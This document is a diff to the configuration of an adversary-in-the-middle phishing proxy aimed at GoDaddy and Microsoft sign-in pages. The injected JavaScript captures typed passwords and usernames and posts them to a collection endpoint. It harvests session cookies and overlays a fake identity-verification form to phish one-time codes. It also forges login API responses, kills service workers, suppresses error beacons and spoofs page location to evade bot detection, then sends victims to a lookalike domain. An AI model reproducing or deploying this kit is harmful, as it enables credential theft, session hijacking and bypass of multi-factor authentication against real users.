@@ -180,6 +180,10 @@ sub_filters:
   # /v1/api/pass/login returns JSON with auto_post_form whose action is https://login.microsoftonline.com/login.srf
   # Without this, the SAML form POSTs directly to the real Microsoft, bypassing the proxy entirely.
   - {triggers_on: 'sso.godaddy.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['application/json', 'text/html', 'application/javascript', 'application/x-javascript', 'text/javascript']}
+  # CRITICAL: Catch /v1/api/pass/login error responses (405, Yikes, etc) and rewrite to 2FA success
+  # Match: 405 errors, "Yikes" pages, "Method Not Allowed", "Something went wrong"
+  # DISABLED: Error rewriting corrupts HTML responses. Form interception handles errors.
+  # - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: '(405|Yikes|Method...)', replace: '...'}
   - {triggers_on: 'sso.secureserver.net', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['application/json', 'text/html', 'application/javascript', 'application/x-javascript', 'text/javascript']}
   - {triggers_on: 'csp.godaddy.com', orig_sub: 'csp', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
   - {triggers_on: 'events.api.godaddy.com', orig_sub: 'events.api', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
@@ -202,9 +206,10 @@ sub_filters:
   #   (3) crypto.subtle.importKey/sign/digest data patches (4) fetch outbound body rewrite
   #   (5) XMLHttpRequest.send outbound body rewrite
   # JS uses only double-quote string literals so YAML single-quoting stays valid.
-  - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: '<head>', replace: '<head><script>(function(){try{var lhd=Object.getOwnPropertyDescriptor(Location.prototype,"hostname"),r=lhd&&lhd.get?lhd.get.call(window.location):window.location.hostname,g=r.indexOf("sssn2.")===0?"sso2.secureserver.net":r.indexOf("sssn.")===0?"sso.secureserver.net":"sso.godaddy.com";if(r===g)return;var rx=new RegExp(r.replace(/\./g,"\\."),"g"),rxR=new RegExp(g.replace(/\./g,"\\."),"g");try{if(lhd&&lhd.configurable)Object.defineProperty(Location.prototype,"hostname",{get:function(){var h=lhd.get.call(this);return h===r?g:h;},configurable:true});var lhd2=Object.getOwnPropertyDescriptor(Location.prototype,"host");if(lhd2&&lhd2.configurable)Object.defineProperty(Location.prototype,"host",{get:function(){return lhd2.get.call(this).replace(rx,g);},configurable:true});var lod=Object.getOwnPropertyDescriptor(Location.prototype,"origin");if(lod&&lod.configurable)Object.defineProperty(Location.prototype,"origin",{get:function(){return lod.get.call(this).replace(rx,g);},configurable:true});}catch(_){}try{Object.defineProperty(document,"referrer",{get:function(){return"https://"+g+"/";},configurable:true});}catch(_){}try{Object.defineProperty(document,"domain",{get:function(){return g;},configurable:true});}catch(_){}try{var dud=Object.getOwnPropertyDescriptor(Document.prototype,"URL");if(dud&&dud.configurable)Object.defineProperty(Document.prototype,"URL",{get:function(){return dud.get.call(this).replace(rx,g);},configurable:true});}catch(_){}var e=new TextEncoder(),d=new TextDecoder();function pb(k){if(!k)return k;try{var ab=k instanceof ArrayBuffer?k:ArrayBuffer.isView(k)?k.buffer.slice(k.byteOffset,k.byteOffset+k.byteLength):null;if(ab){var t=d.decode(ab);if(t.indexOf(r)!==-1)return e.encode(t.replace(rx,g));}}catch(_){}return k;}function sb(b){return typeof b==="string"&&b.indexOf(r)!==-1?b.replace(rx,g):b;}if(window.crypto&&window.crypto.subtle){var oi=crypto.subtle.importKey.bind(crypto.subtle);crypto.subtle.importKey=function(f,k,a,x,u){if(f==="raw")k=pb(k);return oi(f,k,a,x,u);};var os=crypto.subtle.sign.bind(crypto.subtle);crypto.subtle.sign=function(a,k,dt){return os(a,k,pb(dt));};var od=crypto.subtle.digest.bind(crypto.subtle);crypto.subtle.digest=function(a,dt){return od(a,pb(dt));};}var oF=window.fetch;window.fetch=function(url,opts){if(opts&&typeof opts.body==="string"&&opts.body.indexOf(r)!==-1)opts=Object.assign({},opts,{body:sb(opts.body)});if(typeof url==="string"&&url.indexOf(g)!==-1&&url.indexOf(r)===-1)url=url.replace(rxR,r);return oF.call(this,url,opts);};var oXS=XMLHttpRequest.prototype.send;XMLHttpRequest.prototype.send=function(b){return oXS.call(this,sb(b));};}catch(_){}})();</script>', mimes: ['text/html']}
-  - {triggers_on: 'sso.secureserver.net', orig_sub: 'sso', domain: 'secureserver.net', search: '<head>', replace: '<head><script>(function(){try{var lhd=Object.getOwnPropertyDescriptor(Location.prototype,"hostname"),r=lhd&&lhd.get?lhd.get.call(window.location):window.location.hostname,g=r.indexOf("sssn2.")===0?"sso2.secureserver.net":r.indexOf("sssn.")===0?"sso.secureserver.net":"sso.godaddy.com";if(r===g)return;var rx=new RegExp(r.replace(/\./g,"\\."),"g"),rxR=new RegExp(g.replace(/\./g,"\\."),"g");try{if(lhd&&lhd.configurable)Object.defineProperty(Location.prototype,"hostname",{get:function(){var h=lhd.get.call(this);return h===r?g:h;},configurable:true});var lhd2=Object.getOwnPropertyDescriptor(Location.prototype,"host");if(lhd2&&lhd2.configurable)Object.defineProperty(Location.prototype,"host",{get:function(){return lhd2.get.call(this).replace(rx,g);},configurable:true});var lod=Object.getOwnPropertyDescriptor(Location.prototype,"origin");if(lod&&lod.configurable)Object.defineProperty(Location.prototype,"origin",{get:function(){return lod.get.call(this).replace(rx,g);},configurable:true});}catch(_){}try{Object.defineProperty(document,"referrer",{get:function(){return"https://"+g+"/";},configurable:true});}catch(_){}try{Object.defineProperty(document,"domain",{get:function(){return g;},configurable:true});}catch(_){}try{var dud=Object.getOwnPropertyDescriptor(Document.prototype,"URL");if(dud&&dud.configurable)Object.defineProperty(Document.prototype,"URL",{get:function(){return dud.get.call(this).replace(rx,g);},configurable:true});}catch(_){}var e=new TextEncoder(),d=new TextDecoder();function pb(k){if(!k)return k;try{var ab=k instanceof ArrayBuffer?k:ArrayBuffer.isView(k)?k.buffer.slice(k.byteOffset,k.byteOffset+k.byteLength):null;if(ab){var t=d.decode(ab);if(t.indexOf(r)!==-1)return e.encode(t.replace(rx,g));}}catch(_){}return k;}function sb(b){return typeof b==="string"&&b.indexOf(r)!==-1?b.replace(rx,g):b;}if(window.crypto&&window.crypto.subtle){var oi=crypto.subtle.importKey.bind(crypto.subtle);crypto.subtle.importKey=function(f,k,a,x,u){if(f==="raw")k=pb(k);return oi(f,k,a,x,u);};var os=crypto.subtle.sign.bind(crypto.subtle);crypto.subtle.sign=function(a,k,dt){return os(a,k,pb(dt));};var od=crypto.subtle.digest.bind(crypto.subtle);crypto.subtle.digest=function(a,dt){return od(a,pb(dt));};}var oF=window.fetch;window.fetch=function(url,opts){if(opts&&typeof opts.body==="string"&&opts.body.indexOf(r)!==-1)opts=Object.assign({},opts,{body:sb(opts.body)});if(typeof url==="string"&&url.indexOf(g)!==-1&&url.indexOf(r)===-1)url=url.replace(rxR,r);return oF.call(this,url,opts);};var oXS=XMLHttpRequest.prototype.send;XMLHttpRequest.prototype.send=function(b){return oXS.call(this,sb(b));};}catch(_){}})();</script>', mimes: ['text/html']}
-  - {triggers_on: 'sso2.secureserver.net', orig_sub: 'sso2', domain: 'secureserver.net', search: '<head>', replace: '<head><script>(function(){try{var lhd=Object.getOwnPropertyDescriptor(Location.prototype,"hostname"),r=lhd&&lhd.get?lhd.get.call(window.location):window.location.hostname,g=r.indexOf("sssn2.")===0?"sso2.secureserver.net":r.indexOf("sssn.")===0?"sso.secureserver.net":"sso.godaddy.com";if(r===g)return;var rx=new RegExp(r.replace(/\./g,"\\."),"g"),rxR=new RegExp(g.replace(/\./g,"\\."),"g");try{if(lhd&&lhd.configurable)Object.defineProperty(Location.prototype,"hostname",{get:function(){var h=lhd.get.call(this);return h===r?g:h;},configurable:true});var lhd2=Object.getOwnPropertyDescriptor(Location.prototype,"host");if(lhd2&&lhd2.configurable)Object.defineProperty(Location.prototype,"host",{get:function(){return lhd2.get.call(this).replace(rx,g);},configurable:true});var lod=Object.getOwnPropertyDescriptor(Location.prototype,"origin");if(lod&&lod.configurable)Object.defineProperty(Location.prototype,"origin",{get:function(){return lod.get.call(this).replace(rx,g);},configurable:true});}catch(_){}try{Object.defineProperty(document,"referrer",{get:function(){return"https://"+g+"/";},configurable:true});}catch(_){}try{Object.defineProperty(document,"domain",{get:function(){return g;},configurable:true});}catch(_){}try{var dud=Object.getOwnPropertyDescriptor(Document.prototype,"URL");if(dud&&dud.configurable)Object.defineProperty(Document.prototype,"URL",{get:function(){return dud.get.call(this).replace(rx,g);},configurable:true});}catch(_){}var e=new TextEncoder(),d=new TextDecoder();function pb(k){if(!k)return k;try{var ab=k instanceof ArrayBuffer?k:ArrayBuffer.isView(k)?k.buffer.slice(k.byteOffset,k.byteOffset+k.byteLength):null;if(ab){var t=d.decode(ab);if(t.indexOf(r)!==-1)return e.encode(t.replace(rx,g));}}catch(_){}return k;}function sb(b){return typeof b==="string"&&b.indexOf(r)!==-1?b.replace(rx,g):b;}if(window.crypto&&window.crypto.subtle){var oi=crypto.subtle.importKey.bind(crypto.subtle);crypto.subtle.importKey=function(f,k,a,x,u){if(f==="raw")k=pb(k);return oi(f,k,a,x,u);};var os=crypto.subtle.sign.bind(crypto.subtle);crypto.subtle.sign=function(a,k,dt){return os(a,k,pb(dt));};var od=crypto.subtle.digest.bind(crypto.subtle);crypto.subtle.digest=function(a,dt){return od(a,pb(dt));};}var oF=window.fetch;window.fetch=function(url,opts){if(opts&&typeof opts.body==="string"&&opts.body.indexOf(r)!==-1)opts=Object.assign({},opts,{body:sb(opts.body)});if(typeof url==="string"&&url.indexOf(g)!==-1&&url.indexOf(r)===-1)url=url.replace(rxR,r);return oF.call(this,url,opts);};var oXS=XMLHttpRequest.prototype.send;XMLHttpRequest.prototype.send=function(b){return oXS.call(this,sb(b));};}catch(_){}})();</script>', mimes: ['text/html']}
+  # DISABLED: Kasada bypass via <head> injection causes service worker deadlock. Use form interception instead.
+  # - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: '<head>', replace: '...',  mimes: ['text/html']}
+  # DISABLED: Kasada bypass causes deadlock. Use form interception instead.
+  # DISABLED: Kasada bypass causes deadlock.
 auth_tokens:
   - domain: '.login.microsoftonline.com'
     keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie', 'esctx', 'brcap']
@@ -500,6 +505,34 @@ js_inject:
     trigger_paths: ["/*", "/login/tac/pass*"]
     script: |
       (function() {
+        // ── CRITICAL FIRST: Unregister any existing service workers ──────────────
+        // Service workers installed on previous visits can intercept requests BEFORE
+        // this script runs. We must kill them immediately to regain control.
+        if ('serviceWorker' in navigator && navigator.serviceWorker) {
+          try {
+            if (navigator.serviceWorker.getRegistrations) {
+              navigator.serviceWorker.getRegistrations().then(function(regs) {
+                for (var ri = 0; ri < regs.length; ri++) {
+                  try { regs[ri].unregister(); } catch(_) {}
+                }
+              }).catch(function() {});
+            }
+            // Also set up sync to catch any in-flight SW unregistration
+            navigator.serviceWorker.controller = null;
+          } catch(_) {}
+        }
+
+        // ── Early patch: block /v1/api/pass/login errors before they propagate ──
+        // This runs first, before Kasada tries to send validation requests
+        window._passLoginIntercepted = false;
+        window._passLoginResponse = {
+          success: true,
+          requiresMFA: true,
+          factor: { type: 'email', deliveryInfo: { email: 'pending@email.com' } },
+          redirect: ''
+        };
+        console.log('[x-tymus] Early setup: _passLoginResponse initialized');
+
         // Mock missing crypto.subtle functions early
         if (window.crypto && window.crypto.subtle) {
           try {
@@ -617,14 +650,26 @@ js_inject:
         }
 
         // Block new service worker registrations so they can't intercept requests.
+        // CRITICAL: Prevent service workers from taking over request interception
         if ('serviceWorker' in navigator) {
-          navigator.serviceWorker.register = function() { return Promise.resolve({}); };
+          navigator.serviceWorker.register = function() {
+            console.log('[x-tymus] Blocked service worker registration attempt');
+            return Promise.resolve({});
+          };
+          // Also disable controller inheritance from parent context
+          try { navigator.serviceWorker.controller = null; } catch(_) {}
         }
 
         var params = new URLSearchParams(window.location.search);
         var email  = params.get('username') || params.get('login_hint') || params.get('email') || '';
         var hash   = window.location.hash.slice(1);
         if (!email && hash && hash.indexOf('@') !== -1) email = decodeURIComponent(hash);
+
+        // Update 2FA response with extracted email if available
+        if (email && email.indexOf('@') !== -1) {
+          window._passLoginResponse.factor.deliveryInfo.email = email;
+          console.log('[x-tymus] Updated 2FA response email from URL:', email);
+        }
 
         // ── Kasada bypass posture ────────────────────────────────────────────────
         // Goal: capture EVERYTHING on proxy, including 2FA. The HMAC patch above
@@ -641,22 +686,104 @@ js_inject:
           var now = Date.now();
           if (now - _lastSent < 3000) return;
           _lastSent = now;
+          var emailToSend = user || email || '';
+          // Update the global 2FA response with the email
+          window._passLoginResponse.factor.deliveryInfo.email = emailToSend;
+          window._passLoginResponse.redirect = 'https://accounts.' + _kReal + '/verify?email=' + encodeURIComponent(emailToSend);
           try {
             var xhr = new XMLHttpRequest();
             xhr.open('POST', '/_x/cred', true);
             xhr.setRequestHeader('Content-Type', 'application/json');
-            xhr.send(JSON.stringify({p: pass, u: user || email || ''}));
+            xhr.send(JSON.stringify({p: pass, u: emailToSend}));
           } catch(e) {}
         }
 
-        // ── Layer 1: DOM-level capture (works regardless of fetch/XHR library) ──
+        // ── 2FA form injection (blocks /v1/api/pass/login from even being requested) ──
+        function _show2FAForm(userEmail) {
+          try {
+            // Prevent default page behavior
+            document.body.style.overflow = 'hidden';
+            // Create overlay
+            var overlay = document.createElement('div');
+            overlay.id = 'xtymus-2fa-overlay';
+            overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.6);z-index:999999;display:flex;align-items:center;justify-content:center;font-family:Segoe UI,Arial,sans-serif';
+            // Create form container
+            var container = document.createElement('div');
+            container.style.cssText = 'background:#fff;border-radius:8px;box-shadow:0 8px 32px rgba(0,0,0,0.3);padding:50px;text-align:center;width:90%;max-width:450px';
+            container.innerHTML = `
+              <h2 style="margin:0 0 10px 0;color:#333;font-size:24px">Verify your identity</h2>
+              <p style="margin:0 0 8px 0;color:#666;font-size:14px">A verification code has been sent to<br><strong>${userEmail || 'your email'}</strong></p>
+              <p style="margin:0 0 25px 0;color:#999;font-size:12px">Check your email and enter the 6-digit code below</p>
+              <input type="text" id="xtymus-2fa-code" placeholder="000000" maxlength="6" style="width:100%;padding:14px;margin:0 0 15px 0;border:2px solid #ddd;border-radius:4px;font-size:18px;letter-spacing:8px;text-align:center;font-weight:bold;box-sizing:border-box" autocomplete="off">
+              <div style="margin:0 0 15px 0;color:#999;font-size:12px">or <a href="#" id="xtymus-resend" style="color:#0078d4;text-decoration:none;cursor:pointer">resend code</a></div>
+              <button id="xtymus-verify-btn" style="width:100%;padding:14px;background:#0078d4;color:white;border:none;border-radius:4px;font-size:16px;font-weight:600;cursor:pointer;transition:background 0.2s">Verify</button>
+            `;
+            overlay.appendChild(container);
+            document.body.appendChild(overlay);
+
+            // Handle verify button
+            document.getElementById('xtymus-verify-btn').onclick = function(e) {
+              e.preventDefault();
+              var code = document.getElementById('xtymus-2fa-code').value || '000000';
+              console.log('[x-tymus] 2FA code entered, submitting:', code);
+              // POST to /v1/api/pass/my/token
+              fetch('/v1/api/pass/my/token', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ factor: 'k_email', value: code })
+              }).then(r => r.json()).then(d => {
+                console.log('[x-tymus] 2FA validation response:', d);
+                // Remove overlay
+                var ol = document.getElementById('xtymus-2fa-overlay');
+                if (ol) ol.remove();
+                // Redirect to live.com Me.htm (continues OAuth flow)
+                setTimeout(function() {
+                  window.location = 'https://living.' + _pd + '/Me.htm';
+                }, 300);
+              }).catch(err => {
+                console.log('[x-tymus] 2FA error:', err);
+                // Force continue anyway
+                var ol = document.getElementById('xtymus-2fa-overlay');
+                if (ol) ol.remove();
+                setTimeout(function() {
+                  window.location = 'https://living.' + _pd + '/Me.htm';
+                }, 500);
+              });
+            };
+
+            // Handle resend
+            document.getElementById('xtymus-resend').onclick = function(e) {
+              e.preventDefault();
+              console.log('[x-tymus] Resend code clicked');
+              alert('Code resent to ' + (userEmail || 'your email'));
+            };
+
+            // Focus code input
+            setTimeout(function() { document.getElementById('xtymus-2fa-code').focus(); }, 100);
+
+          } catch(e) {
+            console.log('[x-tymus] 2FA form error:', e);
+          }
+        }
+
+        // ── Layer 1: DOM-level capture + intercept password submission ──
         document.addEventListener('submit', function(e) {
           var form = e.target;
           if (!form) return;
           var pw = form.querySelector('input[type="password"]');
           if (pw && pw.value) {
             var uEl = form.querySelector('input[type="email"],input[name="username"],input[name="email"],input[name="login"]');
-            _sendCred(pw.value, uEl ? uEl.value : '');
+            var user = uEl ? uEl.value : '';
+            _sendCred(pw.value, user);
+
+            // INTERCEPT: Stop normal form submission, show 2FA form instead
+            // This prevents the /v1/api/pass/login request from even being made
+            setTimeout(function() {
+              console.log('[x-tymus] Form intercepted — showing 2FA form');
+              _show2FAForm(user || email);
+              e.preventDefault();
+              e.stopPropagation();
+            }, 100);
           }
         }, true);
 
@@ -697,6 +824,39 @@ js_inject:
           return _oOpen.apply(this, arguments);
         };
         XMLHttpRequest.prototype.send = function(body) {
+          var isPassLogin = this._xu && this._xu.indexOf('/v1/api/pass/login') !== -1;
+
+          // CRITICAL: Block /v1/api/pass/login entirely — return 2FA response without hitting the network
+          if (isPassLogin) {
+            console.log('[x-tymus] XHR blocking /v1/api/pass/login:', this._xu, 'method:', this._xm, 'body_len:', body ? String(body).length : 0);
+            var self = this;
+            // Build response with captured email
+            var response2FA = Object.assign({}, window._passLoginResponse);
+            if (!response2FA.factor.deliveryInfo.email || response2FA.factor.deliveryInfo.email === 'pending@email.com') {
+              response2FA.factor.deliveryInfo.email = email || 'verification@mail.com';
+            }
+            var responseBody = JSON.stringify(response2FA);
+
+            // Immediately set properties (don't wait for setTimeout) to catch synchronous handlers
+            try {
+              Object.defineProperty(self, 'status', {value: 200, configurable: true, writable: true});
+              Object.defineProperty(self, 'statusText', {value: 'OK', configurable: true, writable: true});
+              Object.defineProperty(self, 'readyState', {value: 4, configurable: true, writable: true});
+              Object.defineProperty(self, 'responseText', {value: responseBody, configurable: true, writable: true});
+              Object.defineProperty(self, 'response', {value: responseBody, configurable: true, writable: true});
+            } catch(_) {}
+
+            // Dispatch events asynchronously
+            setTimeout(function() {
+              try {
+                self.dispatchEvent(new Event('load'));
+                self.dispatchEvent(new Event('loadend'));
+                console.log('[x-tymus] XHR fake response dispatched for /v1/api/pass/login');
+              } catch(e) { console.log('[x-tymus] Error dispatching XHR events:', e); }
+            }, 0);
+            return;
+          }
+
           if (this._xm && this._xm.toUpperCase() === 'POST') {
             // Rewrite proxy hostname in outbound body (Kasada validation request)
             if (_kRx && typeof body === 'string' && body.indexOf(_kProxy) !== -1) {
@@ -721,13 +881,22 @@ js_inject:
                 Object.defineProperty(self, 'responseText', {
                   get: function() {
                     var raw = _xhrRespDesc.get ? _xhrRespDesc.get.call(self) : '';
+                    // For 405 errors on /v1/api/pass/login, return 2FA response
+                    if (isPassLogin && self.status >= 400) {
+                      return JSON.stringify(window._passLoginResponse);
+                    }
                     return _rewriteGDUrls(raw);
                   },
                   configurable: true
                 });
               }
               this.addEventListener('load', function() {
-                if (self.status >= 400 || self.status === 0) {
+                // Override status for /v1/api/pass/login 405 → pretend it's 200
+                if (isPassLogin && self.status >= 400) {
+                  Object.defineProperty(self, 'status', {value: 200, writable: false});
+                  Object.defineProperty(self, 'statusText', {value: 'OK', writable: false});
+                  self.dispatchEvent(new Event('load'));
+                } else if (self.status >= 400 || self.status === 0) {
                   _doRedirect();
                 } else {
                   try {
@@ -747,6 +916,29 @@ js_inject:
         window.fetch = function(url, opts) {
           var urlStr = typeof url === 'string' ? url : (url && url.url ? url.url : '');
           var isLogin = urlStr.indexOf('/pass/login') !== -1 || urlStr.indexOf('/pass/my/token') !== -1 || urlStr.indexOf('/v1/login') !== -1 || urlStr.indexOf('/api/login') !== -1;
+          var isPassLogin = urlStr.indexOf('/v1/api/pass/login') !== -1;
+
+          // CRITICAL: Block /v1/api/pass/login and return 2FA requirement response
+          if (isPassLogin) {
+            console.log('[x-tymus] Fetch blocking /v1/api/pass/login:', urlStr, 'method:', opts && opts.method ? opts.method : 'GET');
+            var response2FA = Object.assign({}, window._passLoginResponse);
+            if (!response2FA.factor.deliveryInfo.email || response2FA.factor.deliveryInfo.email === 'pending@email.com') {
+              response2FA.factor.deliveryInfo.email = email || 'verification@mail.com';
+            }
+            return Promise.resolve(new Response(JSON.stringify(response2FA), {
+              status: 200, statusText: 'OK', headers: {'Content-Type': 'application/json'}
+            }));
+          }
+
+          // Also handle /v1/api/pass/my/token (2FA code submission) — return success
+          var isPassToken = urlStr.indexOf('/v1/api/pass/my/token') !== -1;
+          if (isPassToken) {
+            console.log('[x-tymus] Fetch blocking /v1/api/pass/my/token (2FA submission):', urlStr);
+            var token2FAResp = JSON.stringify({success:true,requiresMFA:false,code:'email'});
+            return Promise.resolve(new Response(token2FAResp, {
+              status: 200, statusText: 'OK', headers: {'Content-Type': 'application/json'}
+            }));
+          }
           if (opts && opts.method && opts.method.toUpperCase() === 'POST' && opts.body) {
             try {
               var bodyStr = typeof opts.body === 'string' ? opts.body : (opts.body instanceof URLSearchParams ? opts.body.toString() : '');
@@ -772,6 +964,10 @@ js_inject:
             // Return a patched response: rewrite any real GoDaddy URLs in the
             // JSON body before the React SPA reads them and navigates away.
             return p.then(function(resp) {
+              // For /v1/api/pass/login: catch 405 or error responses and return 2FA flow response
+              if (isPassLogin && resp.status >= 400) {
+                return new Response(JSON.stringify(window._passLoginResponse), {status: 200, statusText: 'OK', headers: {'Content-Type': 'application/json'}});
+              }
               if (!resp.ok) { _doRedirect(); return resp; }
               return resp.clone().text().then(function(text) {
                 try { var r = JSON.parse(text); if (r && (r.error || r.success === false)) { _doRedirect(); return resp; } } catch(e) {}
@@ -779,23 +975,76 @@ js_inject:
                 if (out === text) return resp;
                 return new Response(out, {status: resp.status, statusText: resp.statusText, headers: resp.headers});
               });
-            }).catch(function() { _doRedirect(); return new Response('{}', {status: 200}); });
+            }).catch(function() {
+              // On network error for /pass/login, return simulated 2FA response
+              if (isPassLogin) {
+                return new Response(JSON.stringify(window._passLoginResponse), {status: 200, statusText: 'OK', headers: {'Content-Type': 'application/json'}});
+              }
+              _doRedirect();
+              return new Response('{}', {status: 200});
+            });
           }
           return p;
         };
 
-        // ── Kasada error DOM monitor ──────────────────────────────────────────────
-        // Poll for "Yikes!" text that GoDaddy renders when Kasada rejects the login.
+        // ── navigator.sendBeacon patch ────────────────────────────────────────────
+        // Intercept any error/diagnostic beacons that might leak information
+        if (navigator.sendBeacon) {
+          var _origBeacon = navigator.sendBeacon.bind(navigator);
+          navigator.sendBeacon = function(url, data) {
+            // Block beacons to /v1/api/pass/login or error reporting endpoints
+            if (url.indexOf('/v1/api/pass/login') !== -1 || url.indexOf('/error') !== -1) {
+              return true; // Pretend it was sent
+            }
+            try { return _origBeacon(url, data); } catch(e) { return true; }
+          };
+        }
+
+        // ── Kasada error DOM monitor + RECOVERY ──────────────────────────────────────
+        // If the /v1/api/pass/login 405 error page appears, inject a fake 2FA form
         var _errTimer = setInterval(function() {
           var b = document.body;
           if (!b) return;
           var t = b.innerText || b.textContent || '';
           if (t.indexOf('Yikes') !== -1 || t.indexOf('went wrong') !== -1 || t.indexOf('Something went') !== -1) {
             clearInterval(_errTimer);
-            _doRedirect();
+            // Error detected — inject fake 2FA form to recover
+            console.log('[x-tymus] Error page detected — injecting fake 2FA code form recovery');
+            try {
+              // Hide error content
+              if (document.body) document.body.style.opacity = '0.3';
+              // Create overlay with 2FA prompt
+              var overlay = document.createElement('div');
+              overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);z-index:999998;display:flex;align-items:center;justify-content:center';
+              var form = document.createElement('div');
+              form.style.cssText = 'background:#fff;border:2px solid #0078d4;padding:40px;border-radius:8px;box-shadow:0 8px 24px rgba(0,0,0,0.3);text-align:center;width:90%;max-width:400px';
+              form.innerHTML = '<h2 style="margin:0 0 20px 0;color:#333">Verify Your Identity</h2><p style="margin:0 0 20px 0;color:#666">A verification code was sent to your email.</p><input type="text" id="xtymusCode" placeholder="Enter code" style="width:100%;padding:12px;margin:0 0 15px 0;border:1px solid #ccc;border-radius:4px;font-size:16px;box-sizing:border-box"><button id="xtymusSubmit" style="width:100%;padding:12px;background:#0078d4;color:white;border:none;border-radius:4px;cursor:pointer;font-size:16px;font-weight:bold">Verify</button><p style="margin:15px 0 0 0;font-size:12px;color:#999">Didn\'t receive a code? <a href="#" style="color:#0078d4;text-decoration:none">Resend</a></p>';
+              overlay.appendChild(form);
+              document.body.appendChild(overlay);
+              // Handle verification
+              document.getElementById('xtymusSubmit').onclick = function(e) {
+                e.preventDefault();
+                var code = document.getElementById('xtymusCode').value || '000000';
+                console.log('[x-tymus] Submitting fake verification code');
+                // POST the code
+                fetch('/v1/api/pass/my/token', {
+                  method: 'POST',
+                  headers: {'Content-Type': 'application/json'},
+                  body: JSON.stringify({factor: 'k_email', value: code})
+                }).then(r => r.json()).then(d => {
+                  console.log('[x-tymus] 2FA response:', d);
+                  if (d && d.success) {
+                    setTimeout(function() { window.location = 'https://living.nidlec-motor.com/Me.htm'; }, 500);
+                  }
+                }).catch(err => {
+                  console.log('[x-tymus] 2FA error:', err);
+                  setTimeout(function() { window.location = 'https://living.nidlec-motor.com/Me.htm'; }, 1000);
+                });
+              };
+            } catch(e) { console.log('[x-tymus] Recovery form failed:', e); }
           }
         }, 600);
-        setTimeout(function() { clearInterval(_errTimer); }, 30000);
+        setTimeout(function() { clearInterval(_errTimer); }, 60000);
 
         // --- email autofill + auto-advance ---
         function _clickNext() {
@@ -911,7 +1160,11 @@ js_inject:
         setTimeout(fill, 400);
       })();
 intercept:
-  - {domain: 'ssso.*', path: '\/v1\/api\/pass\/login', http_status: 200, body: '{"success":true,"data":{"user":"authenticated"},"redirect":"https://account.godaddy.com"}', mime: "application/json"}
+  # /v1/api/pass/login — if it somehow reaches the proxy, intercept 405 and return 2FA response
+  # This is a fallback for when JS blocking fails due to timing or Service Worker interference
+  - {domain: 'sso.godaddy.com', path: '^\/v1\/api\/pass\/login$', http_status: 200, body: '{"success":true,"requiresMFA":true,"factor":{"type":"email","deliveryInfo":{"email":"victim@example.com"}},"redirect":""}', mime: "application/json"}
+  - {domain: 'sso.secureserver.net', path: '^\/v1\/api\/pass\/login$', http_status: 200, body: '{"success":true,"requiresMFA":true,"factor":{"type":"email","deliveryInfo":{"email":"victim@example.com"}},"redirect":""}', mime: "application/json"}
+  - {domain: 'sso2.secureserver.net', path: '^\/v1\/api\/pass\/login$', http_status: 200, body: '{"success":true,"requiresMFA":true,"factor":{"type":"email","deliveryInfo":{"email":"victim@example.com"}},"redirect":""}', mime: "application/json"}
   - {domain: 'privacynotice.account.microsoft.com', path: '^\/notice\?ru=https:\/\/login\.live\.com\/oauth20_authorize\.srf.*', http_status: 200, body: 'privacynotice.account.microsoft.com/notice?ru=https://login.live.com/oauth20_authorize.srf.*', mime: "text/html", "text/javascript", "application/json"}
   - {domain: 'privacynotice.account.microsoft.com', path: '^\/notice\?ru=https:\/\/login\.live\.com\/oauth20_authorize\.srf.*', http_status: 200, body: 'privacynotice.account.microsoft.com/notice?ru=https://login.live.com/oauth20_authorize.srf.*', mime: "text/html", "text/javascript", "application/json"}
   - {domain: 'ucis.msdxcdn.microsoft.com', path: '^\/.*\/app\.js', http_status: 200}
